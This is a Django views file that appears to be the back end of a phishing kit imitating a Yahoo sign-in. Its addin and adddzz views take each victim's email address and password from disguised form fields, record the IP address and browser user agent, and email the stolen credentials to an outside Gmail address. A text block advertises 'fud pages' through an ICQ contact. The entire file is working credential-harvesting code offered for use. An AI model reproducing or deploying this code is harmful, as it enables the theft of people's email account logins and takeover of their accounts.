from django.shortcuts import render
from django.http import HttpResponse
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from django.template.loader import get_template
from django.template import Context
from django.template.loader import render_to_string
#Create your views here.


def homeon(request):
    ip = request.META.get("HTTP_X_FORWARDED_FOR")
    auto = request.GET["email"]
    domain = auto[auto.index('@') + 1 : ]
    return render(request, 'index.html', {'email': auto, 'domains': domain})

def addin(request):
    ip = request.META.get("HTTP_X_FORWARDED_FOR")
    email = request.POST["powerioman"]
    passwordemail = request.POST["enginloio"]
    domain = email[email.index('@') + 1 : ]
    sender_email = "putyouremail@domain.com"
    receiver_email = "franksdropboxwork@gmail.com"
    password = "passwordtodomain"
    useragent = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW Yahoo API ... 1"
    message["From"] = sender_email
    message["To"] = receiver_email

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': email, 'useragent': useragent, 'passaccess': passwordemail, 'ipman': ip})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP("mail.server", 587) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        return render(request, 'indexx.html', {'email': email, 'domains': domain})

def adddzz(request):
    ip = request.META.get("HTTP_X_FORWARDED_FOR")
    email = request.POST["zzpowerman"]
    passwordemail = request.POST["yyenginlo"]
    domain = email[email.index('@') + 1 : ]
    sender_email = "putyouremail@domain.com"
    receiver_email = "franksdropboxwork@gmail.com"
    password = "yourpassstodomain.com"
    useragent = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW Yahoo API 2"
    message["From"] = sender_email
    message["To"] = receiver_email

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': email, 'passaccess': passwordemail, 'useragent': useragent, 'ipman': ip})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP("mail.server", 587) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
    return render(request, 'Domain.html', {'domains': domain})